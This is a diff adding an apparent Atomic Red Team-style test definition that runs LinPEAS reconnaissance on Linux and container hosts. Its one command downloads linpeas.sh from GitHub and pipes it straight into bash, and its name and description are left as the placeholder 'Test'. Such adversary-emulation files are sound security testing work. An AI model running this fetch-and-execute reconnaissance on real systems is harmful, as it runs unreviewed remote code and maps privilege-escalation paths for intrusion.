@@ -1,0 +1,13 @@
+attack_technique: Test
+display_name: LinPeaS Reconnaissance scripts
+atomic_tests:
+- name: Test
+  description: Test
+  supported_platforms:
+    - linux
+    - containers
+  executor:
+    command: |
+      curl -q -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash -s -- -o system_information,container -q
+    name: bash
+    elevation_required: false
